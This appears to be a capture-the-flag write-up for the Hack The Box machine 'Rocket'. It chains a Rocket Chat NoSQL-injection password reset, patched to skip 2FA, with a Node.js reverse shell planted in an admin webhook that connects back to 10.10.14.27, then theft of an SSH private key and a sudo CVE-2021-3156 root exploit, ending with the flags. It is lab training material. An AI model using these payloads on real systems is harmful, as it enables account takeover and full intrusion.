# Rocket

```
# nmap -sCV -p- rocket.htb
Nmap scan report for rocket.htb (10.129.172.140)
Host is up (0.15s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Rocket Hosting
3000/tcp open  ppp?
```
On port 3000 we can see a Rocket Chat login portal.

As well described in [SonarSource blog](https://blog.sonarsource.com/nosql-injections-in-rocket-chat), Rocket Chat is vulnerable to a NoSQL injection. By resetting the password of a normal user, then a admin account it is possible to execute arbitrary commands through the administration interface.
The exploit can be found [here](https://www.exploit-db.com/exploits/49960).

This exploit needs a low priv user email and an admin email. Those emails can be found on the website port 80.

![Users email addresses](../img/email.png "Users email addresses")

Here we will use `emmap@rocket.htb` (low priv user) and `ezekiel@rocket.htb` (admin user). In the current case the exploit needs to be modified to remove 2FA. We applied the following patch:

```python
def changingadminpassword(url,token,code):
	#payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"'+code+'\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\",{\\"twoFactorCode\\":\\"\\",\\"twoFactorMethod\\":\\"totp\\"}]}"}'
[...]
def twofactor(url,email):
  [...]
  #return code
	return ""
```

```
$ python3 sploit.py -u emmap@rocket.htb -a ezekiel@rocket.htb -t http://rocket.htb:3000/
[+] Resetting emmap@rocket.htb password
[+] Password Reset Email Sent
Got: _
Got: _r
Got: _rn
Got: _rnZ
Got: _rnZc
Got: _rnZcF
Got: _rnZcF4
Got: _rnZcF4a
Got: _rnZcF4a2
Got: _rnZcF4a2J
Got: _rnZcF4a2JR
[...]
Got: _rnZcF4a2JRRP7xY_AGDxMjEOuKxKL-9XvYtAVHmhkO
[+] Got token : _rnZcF4a2JRRP7xY_AGDxMjEOuKxKL-9XvYtAVHmhkO
[+] Password was changed !
[+] Succesfully authenticated as emmap@rocket.htb
Got the code for 2fa: ices.totp is undefined :\n@:1:56\n@:1:49\n"}
[+] Resetting ezekiel@rocket.htb password
[+] Password Reset Email Sent
Got: n
Got: nO
Got: nOi
Got: nOi2
[...]
[+] Got token : nOi2zKQPCeLk-AJn3ApDl5JtzOtfnBn-SONT6oihZC0
[+] Admin password changed !
```

Once admin password changed we can login with username `admin` and password `P@$$w0rd!1234`.

We can add the following reverse shell on the `administration interface / integrations / web hook`:
```js
const require = console.log.constructor('return process.mainModule.require')();
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(80, "10.10.14.27", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

![RCE with the web hook](../img/rce_admin.png "RCE with the web hook")

When hitting the Webhook URL(see screen above) the revshell is connecting back to us:

```
$ nc -nvlp 80
Listening on [0.0.0.0] (family 2, port 80)
Connection from 10.129.1.7 50358 received!
id
uid=1000(ezekiel) gid=1000(ezekiel) groups=1000(ezekiel)
```
We can grab ezekiel rsa key to get an fully operational shell:
```
cat /home/ezekiel/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsEzrkmU/V0/a5EzaBR58XHHtnI7azu003705Pz+2Z+Q3fD9G+K/g
[...]
```

Once connected to ezekiel we can get user flag. We also noticed the sudo version is vulnerable to CVE-2021-3156.
The exploit we used can be found [here](https://github.com/r4j0x00/exploits/tree/master/CVE-2021-3156_one_shot).
```
ssh ezekiel@rocket.htb -i ezekiel_id_rsa

ezekiel@rocket:~$ cat user.txt 
HTB{th3_p4ssw0rd_r3s3t_api_1s_n0t_r0ck_s0l1d}

ezekiel@rocket:/tmp$ sudo -V
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
ezekiel@rocket:/tmp$ make
gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:75:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
   75 |     execve(argv[0], argv, env);
      |     ^~~~~~
mkdir libnss_X
gcc -g -fPIC -shared sice.c -o libnss_X/X.so.2
ezekiel@rocket:/tmp$ ./exploit
uid=0(root) gid=1000(ezekiel) groups=1000(ezekiel)
root@rocket:/tmp#
root@rocket:/tmp# cat /root/root.txt
HTB{4lw4ys_upgr4d3_y0ur_syst3ms}
```